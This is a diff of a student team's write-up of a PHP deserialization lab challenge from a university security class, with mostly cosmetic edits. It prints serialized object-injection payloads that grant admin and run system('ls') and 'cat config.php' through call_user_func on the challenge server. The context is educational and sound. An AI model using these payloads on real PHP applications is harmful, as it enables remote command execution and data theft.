@@ -1,20 +1,20 @@
 ---
-title: PHP Serialization Challenge - NT521.ANTT LAB
+title: PHP Serialization Challenge - NT521.ANTT - LAB
 tags: [NT521.ANTT, CTF Write-ups]
 style: border
 color: dark
-description: This is our task from teacher at NT521.ANTT pratical class (Nghi Hoang Khoa). My team called by 54010N  ^^
+description: This is the task from teacher at NT521.ANTT pratical class (Nghi Hoang Khoa) for my team - 54010N Team.
 ---
 
 ![](https://raw.githubusercontent.com/nh4ttruong/nh4ttruong.github.io/main/_posts/nt521-antt/images/cover.png)
 
 ## Decription
-This is our task from teacher at NT521.ANTT pratical class (Nghi Hoang Khoa). My team called by **54010N** and you can see us in [CTF Time](https://ctftime.org/team/143012)
+This is our task from teacher at NT521.ANTT pratical class (Nghi Hoang Khoa). My team called by **54010N** and you can meet us in [CTF Time](https://ctftime.org/team/143012)
 
 As teacher say, our work is find out flag of challenge by exploiting the PHP serialize/deserialize vulnerability.
 
 ## Challenge
-Link: *http://45.122.249.68:10001*
+Link: *[http://45.122.249.68:10001](http://45.122.249.68:10001)*
 
 If you're lazy, you can see the quick code [here](https://raw.githubusercontent.com/nh4ttruong/nh4ttruong.github.io/main/_posts/nt521-antt/chall.php)
 
@@ -24,9 +24,11 @@ By reading and following the code, we analysed the code and proposed a few judgm
 **Source code overview**
 
 If `isset($_GET['code']` not null, the site will unserialize the code input which we can put it into the site to request.
-The code input is a object type. We have to serialize the code to right format and request to server. **(1)**
+The code input is a object type. We have to serialize the code to right format and request to server.
 
 **About *class User***
+
+I put the code of this class here so that you can follow easily:
 ```php
 class User{
     private $name;
@@ -47,11 +49,11 @@ By *our test below*, we see that the output will add a "54010N" property into Us
 
 ![](https://raw.githubusercontent.com/nh4ttruong/nh4ttruong.github.io/main/_posts/nt521-antt/images/usertest.png)
 
-Moreover, the `$name` and `$is_admin` properties are changed to `Username` and `Useris_admin` ?? :smile: ??.  *What is special when author make that?* **(2)**
+Moreover, the `$name` and `$is_admin` properties are changed to `Username` and `Useris_admin` ?? :smile: ??.  *What is special when author make that?* **(?)**
 
 **About *class Show_color***
 
-I put the code of User class here so that you can follow easily:
+I put the code of this class here so that you can follow easily:
 ```php
 class Show_color{
     public $color;
@@ -66,7 +68,7 @@ class Show_color{
 }
 ```
 
-You can see that this class have the `call_user_func()` which have the feature like callback function [(call the callback function)](https://www.php.net/manual/en/function.call-user-func.php). So, here is probably the key of the challege ^^. We can use it to call any the function in program :3.
+You can see that this class have the `call_user_func()` which have the feature like callback function [(call the callback function)](https://www.php.net/manual/en/function.call-user-func.php). So, here is probable the key of the challege ^^. We can use it to call any the function in program :3.
 
 In line `call_user_func($this->type->adu,$this->color);`, the first parameter will call `$this->type->adu` but *where is `adu` property?*
 
@@ -96,14 +98,14 @@ $showcolor = new Show_color($user, 'ls');
 $code = serialize($showcolor);
 echo $code;
 ```
-> Output: `O:10:"Show_color":2:{s:5:"color";s:2:"ls";s:4:"type";O:4:"User":3:{s:10:"Username";N;s:14:"Useris_admin";b:0;s:3:"adu";s:3:"adu";}}`
+> Output: `O:10:"Show_color":2:{s:5:"color";s:2:"ls";s:4:"type";O:4:"User":3:{s:10:"Username";N;s:14:"Useris_admin";b:0;s:3:"adu";s:3:"adu";}}` **(??)**
 
 Using this output as payload:
 
 ![](https://raw.githubusercontent.com/nh4ttruong/nh4ttruong.github.io/main/_posts/nt521-antt/images/wrong.png)
 
 The *ls* command is not execute and the server return a error. So we need to repair the payload.
-- As mention in **(1)**, `name` and `is_admin` in User's class were added the string *"User"* to head so we need to remove it before request to server.
+- As mention in **(?)** and output result of **(??)** , `name` and `is_admin` in User's class were added the string *"User"* to head so we need to remove it before request to server.
 - We have to change the `is_admin` from `false` to `true` by change the *"is_admin";b:0;"* as *"is_admin";b:1;"* so that we can become a importor as admin.
 - Specialy, the server is not compile `system("ls")` command because the `adu` property have *adu* value rather than *system* value. So, the system will be compile *adu("ls")* instead of *system("ls")*. That is the reason why we must to change the value of `adu` property to *"system"*.
 
@@ -115,7 +117,7 @@ Now, let's request by the changed payload:
 Yeah, we are success when execute `system("ls")` on the server. Now our work is checking files and find out the flag because the string *"hi admin, here is your flag"* is not the flag :(((
 > Payload: `O:10:"Show_color":2:{s:5:"color";s:14:"cat config.php";s:4:"type";O:4:"User":3:{s:4:"name";N;s:8:"is_admin";b:1;s:3:"adu";s:6:"system";}}`
 
-*Ctrl + U* is shortcut key to view source and it's the way that we captured the flag :3
+*Ctrl + U* is shortcut key to view source and it's the way that we captured the flag 😅
 ![](https://raw.githubusercontent.com/nh4ttruong/nh4ttruong.github.io/main/_posts/nt521-antt/images/flag.png)
 
 **Note:**
